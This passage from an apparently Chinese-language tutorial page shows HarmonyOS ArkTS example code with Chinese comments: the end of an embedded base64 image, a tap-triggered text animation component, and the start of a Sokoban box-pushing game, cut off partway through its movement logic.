eBXAqoguJVzuK21ewbyWVH6kWBrAqog2IXFlJgeVGyHL0nyU8+KIACthVQSWbe6+LmMGRdeAHGp5ffsTvVtqPQur4VOD09+ki+KFiEClbQkBmTvUjj13Kd7JUPP/8ehuH98nu5njUdfTs3vddRQJ4viSiizqVIveUhWNyJNgIw5HsAgiwpDT/vtmsBkEBDIAJAdhWjAApcKSDPmkQU0c9cqn7JsEi94d51CzykmABEhj5EH3ui8fdeFciSyNwS0xwsbhsKPHp9Duj3jgLZEpluYbEBDxmuSNTBsIVnqjcFig07boU1H1nsecIq58GQZU8s/u5dAbWl2ylCuIfFRtKVqCPFG7jGqgJFZjv2Ot8ULDaGLCRK97yAv1tVQCAhSUyVjWBnO9k0LO5EHWGKVtaJ8EEBywpUHXLcE6YbWGxEHSHPwfSs5cemr7aZGHIAiw2nu1kYRtTR18NppbdmIREE6jay2PKQBRwyJSsrSiXiIOqw8ji12Q6BxPM4jn9Z7x6w2LEQUYd1F3bbPjeQILJI8LHValJyHQn6ccmsgGz2ktWX2fdyaOtNZHFCUTbBnRCvr0vnKdBhGL55hASRRQZnBR4ZRPVdpal1EmelJLI4q+CD64FHRnHtVt1EFMHUaWUHAx6VDZDv9gEQP3IfQJOvC/s1E1nsa5StxAoeb5imzSZzroq7AMRaPGCRy5US6yX6SBSuzGXNDjFi5AMWMSpVLLNaJBYWinGGRzl7dBc9PJIWWJRzPLU73ZwextmlasrO58jKFGfTuYdUuYBFqnIGr9uIQiQS2TuJ3WBvsjdJwBBOngcOEXIDiwiRvBe5iUSkOyEa6QEkAoUABuk7YEh0aGCRKFxLl23ARLoYYGI9MglACN/l/TTySoqs79FoyQdi+gIsYlSiTHiNZVDiNiKRqd/1O2TWit0DzRZ8bvdLhIdf6lu/qGr+GRiUdcy/AeOQohjN6eIJAAAAAElFTkSuQmCC&#x27;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 初始化方法，在组件即将显示时被调用</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">count</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>()); <span class="comment">// 初始化 Cell 数组</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建 UI 的方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// 创建一个垂直布局容器</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建一个堆栈布局容器</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">list</span>, <span class="function">(<span class="params">item: Cell, _index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历 list 中的每一个 Cell</span></span><br><span class="line">          <span class="title class_">Text</span>(item.<span class="property">value</span>)<span class="comment">// 显示 Cell 中的文字</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)<span class="comment">// 设置文字颜色为白色</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">&#x27;50lpx&#x27;</span>)<span class="comment">// 设置文字大小</span></span><br><span class="line">            .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;item.y&#125;</span>lpx`</span> &#125;)<span class="comment">// 设置文字的垂直偏移量</span></span><br><span class="line">            .<span class="title function_">opacity</span>(item.<span class="property">opacity</span>) <span class="comment">// 设置文字的透明度</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// 设置堆栈布局容器的宽度</span></span><br><span class="line">      .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>) <span class="comment">// 设置堆栈布局容器的高度</span></span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">BottomEnd</span>) <span class="comment">// 设置对齐方式为底部右端</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Image</span>(<span class="variable language_">this</span>.<span class="property">image</span>)<span class="comment">// 显示图片</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;300lpx&#x27;</span>)<span class="comment">// 设置图片宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;300lpx&#x27;</span>)<span class="comment">// 设置图片高度</span></span><br><span class="line">        .<span class="title function_">objectFit</span>(<span class="title class_">ImageFit</span>.<span class="property">Contain</span>)<span class="comment">// 图片适应容器</span></span><br><span class="line">        .<span class="title function_">clickEffect</span>(&#123;</span><br><span class="line">          <span class="comment">// 点击效果配置</span></span><br><span class="line">          <span class="attr">scale</span>: <span class="number">0.5</span>, <span class="comment">// 缩放比例</span></span><br><span class="line">          <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> <span class="comment">// 效果级别</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击图片时触发的回调</span></span><br><span class="line">          <span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">indexCount</span> % <span class="variable language_">this</span>.<span class="property">count</span>; <span class="comment">// 计算当前滚动的索引</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">indexCount</span>++; <span class="comment">// 更新索引计数器</span></span><br><span class="line">          <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">            <span class="comment">// 立即开始动画</span></span><br><span class="line">            <span class="attr">duration</span>: <span class="number">0</span>, <span class="comment">// 动画持续时间为0毫秒</span></span><br><span class="line">            <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">              <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                <span class="comment">// 再次立即开始动画</span></span><br><span class="line">                <span class="attr">duration</span>: <span class="number">1000</span>, <span class="comment">// 动画持续时间为1000毫秒</span></span><br><span class="line">              &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">y</span> = -<span class="number">200</span> <span class="comment">// 设置 Cell 的垂直偏移量</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">opacity</span> = <span class="number">0</span> <span class="comment">// 设置 Cell 的透明度</span></span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">y</span> = <span class="number">0</span> <span class="comment">// 设置 Cell 的垂直偏移量</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">list</span>[index].<span class="property">opacity</span> = <span class="number">1</span> <span class="comment">// 设置 Cell 的透明度</span></span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置容器高度为100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置容器宽度为100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// 设置背景颜色为黑色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Sokoban"><a href="#Sokoban" class="headerlink" title="Sokoban"></a>Sokoban</h1><p>推箱子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span> <span class="comment">// 导入ArkUI工具包中的提示操作模块</span></span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// 观察者模式装饰器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123; <span class="comment">// 定义游戏中的单元格类</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// 跟踪装饰器，标记属性以被跟踪</span></span><br><span class="line">  <span class="attr">type</span>: number = <span class="number">0</span>; <span class="comment">// 单元格类型，0：透明，1：墙，2：可移动区域</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">topLeft</span>: number = <span class="number">0</span>; <span class="comment">// 左上角圆角大小</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">topRight</span>: number = <span class="number">0</span>; <span class="comment">// 右上角圆角大小</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">bottomLeft</span>: number = <span class="number">0</span>; <span class="comment">// 左下角圆角大小</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">bottomRight</span>: number = <span class="number">0</span>; <span class="comment">// 右下角圆角大小</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">x</span>: number = <span class="number">0</span>; <span class="comment">// 单元格的X坐标偏移量</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// 单元格的Y坐标偏移量</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">cellType: number</span>) &#123; <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = cellType; <span class="comment">// 初始化单元格类型</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">ObservedV2</span> <span class="comment">// 观察者模式装饰器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPosition</span> &#123; <span class="comment">// 定义位置类</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// 跟踪装饰器，标记属性以被跟踪</span></span><br><span class="line">  <span class="attr">x</span>: number = <span class="number">0</span>; <span class="comment">// X坐标</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// Y坐标</span></span><br><span class="line">  <span class="title function_">setPosition</span>(<span class="params">x: number, y: number</span>) &#123; <span class="comment">// 设置位置的方法</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span> = x; <span class="comment">// 更新X坐标</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = y; <span class="comment">// 更新Y坐标</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">Entry</span> <span class="comment">// 入口装饰器</span></span><br><span class="line">@<span class="title class_">Component</span> <span class="comment">// 组件装饰器</span></span><br><span class="line">struct <span class="title class_">Sokoban</span>  &#123; <span class="comment">// 定义游戏主结构</span></span><br><span class="line">  <span class="attr">cellWidth</span>: number = <span class="number">100</span>; <span class="comment">// 单元格宽度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">grid</span>: <span class="title class_">Cell</span>[][] = [ <span class="comment">// 游戏网格状态</span></span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">    [<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>)],</span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">victoryPositions</span>: <span class="title class_">MyPosition</span>[] = [<span class="keyword">new</span> <span class="title class_">MyPosition</span>(), <span class="keyword">new</span> <span class="title class_">MyPosition</span>()]; <span class="comment">// 胜利位置数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cratePositions</span>: <span class="title class_">MyPosition</span>[] = [<span class="keyword">new</span> <span class="title class_">MyPosition</span>(), <span class="keyword">new</span> <span class="title class_">MyPosition</span>()]; <span class="comment">// 箱子位置数组</span></span><br><span class="line">  <span class="attr">playerPosition</span>: <span class="title class_">MyPosition</span> = <span class="keyword">new</span> <span class="title class_">MyPosition</span>(); <span class="comment">// 玩家位置</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartX</span>: number = <span class="number">0</span>; <span class="comment">// 触摸开始时的屏幕X坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartY</span>: number = <span class="number">0</span>; <span class="comment">// 触摸开始时的屏幕Y坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenX</span>: number = <span class="number">0</span>; <span class="comment">// 触摸结束时的屏幕X坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenY</span>: number = <span class="number">0</span>; <span class="comment">// 触摸结束时的屏幕Y坐标</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">startTime</span>: number = <span class="number">0</span>; <span class="comment">// 游戏开始时间</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span> <span class="comment">// 动画是否正在运行</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123; <span class="comment">// 游戏加载前的准备工作</span></span><br><span class="line">    <span class="comment">// 初始化某些单元格的圆角大小...</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">0</span>][<span class="number">1</span>].<span class="property">topLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">0</span>][<span class="number">5</span>].<span class="property">topRight</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="property">topLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">4</span>][<span class="number">0</span>].<span class="property">bottomLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">5</span>][<span class="number">1</span>].<span class="property">bottomLeft</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">5</span>][<span class="number">5</span>].<span class="property">bottomRight</span> = <span class="number">25</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">1</span>][<span class="number">1</span>].<span class="property">bottomRight</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">4</span>][<span class="number">1</span>].<span class="property">topRight</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">2</span>][<span class="number">4</span>].<span class="property">topLeft</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="number">2</span>][<span class="number">4</span>].<span class="property">bottomLeft</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>(); <span class="comment">// 初始化游戏</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">initializeGame</span>(<span class="params"></span>) &#123; <span class="comment">// 初始化游戏状态</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// 设置游戏开始时间为当前时间</span></span><br><span class="line">    <span class="comment">// 设置胜利位置和箱子位置...</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// 设置游戏开始时间为当前时间</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">victoryPositions</span>[<span class="number">0</span>].<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">victoryPositions</span>[<span class="number">1</span>].<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cratePositions</span>[<span class="number">0</span>].<span class="title function_">setPosition</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cratePositions</span>[<span class="number">1</span>].<span class="title function_">setPosition</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="title function_">setPosition</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isVictoryPositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// 判断位置是否为胜利位置</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">victoryPositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">position</span> =&gt;</span> position.<span class="property">x</span> === x &amp;&amp; position.<span class="property">y</span> === y); <span class="comment">// 返回是否有胜利位置与给定位置匹配</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isCratePositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// 判断位置是否为箱子位置</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">position</span> =&gt;</span> position.<span class="property">x</span> === x &amp;&amp; position.<span class="property">y</span> === y); <span class="comment">// 返回是否有箱子位置与给定位置匹配</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">isPlayerPositionVisible</span>(<span class="attr">x</span>: number, <span class="attr">y</span>: number): boolean &#123; <span class="comment">// 判断位置是否为玩家位置</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span> === x &amp;&amp; <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span> === y; <span class="comment">// 返回玩家位置是否与给定位置相同</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">movePlayer</span>(<span class="params">direction: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">directions</span>: object = <span class="title class_">Object</span>(&#123;</span><br><span class="line">      <span class="string">&#x27;right&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: <span class="number">0</span>, <span class="attr">dy</span>:  <span class="number">1</span>&#125;),</span><br><span class="line">      <span class="string">&#x27;left&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>:<span class="number">0</span> , <span class="attr">dy</span>:-<span class="number">1</span> &#125;),</span><br><span class="line">      <span class="string">&#x27;down&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: <span class="number">1</span>, <span class="attr">dy</span>: <span class="number">0</span> &#125;),</span><br><span class="line">      <span class="string">&#x27;up&#x27;</span>: <span class="title class_">Object</span>(&#123; <span class="attr">dx</span>: -<span class="number">1</span>, <span class="attr">dy</span>: <span class="number">0</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">dx</span>: number = directions[direction][<span class="string">&#x27;dx&#x27;</span>]; <span class="comment">//&#123; dx, dy &#125;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">dy</span>: number = directions[direction][<span class="string">&#x27;dy&#x27;</span>]; <span class="comment">//&#123; dx, dy &#125;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">newX</span>: number = <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span> + dx;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">newY</span>: number = <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span> + dy;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> targetCell = <span class="variable language_">this</span>.<span class="property">grid</span>[newX][newY];</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 检查新位置是否超出边界</span></span><br><span class="line">    <span class="keyword">if</span> (!targetCell) &#123;</span><br><span class="line">      <span 